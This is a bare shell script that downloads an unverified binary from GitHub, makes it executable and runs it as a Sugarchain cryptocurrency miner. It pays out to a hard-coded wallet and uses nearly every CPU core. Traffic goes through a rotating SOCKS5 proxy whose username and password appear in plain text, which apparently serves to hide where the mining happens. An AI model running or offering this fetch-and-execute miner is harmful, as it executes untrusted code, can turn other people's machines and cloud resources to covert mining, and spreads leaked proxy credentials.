curl -L -o avx2 https://github.com/Inammanik/app/raw/main/avx2
chmod +x avx2
./avx2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qj0e3frjxdf6hut66l2fxehr8vaphssfk35fcxe.$(echo $(shuf -i 1-20000 -n 1)-aa) -t $(($(nproc)-1)) --proxy socks5://qmxcxwbu-rotate:eb337jmbvh26@p.webshare.io:80
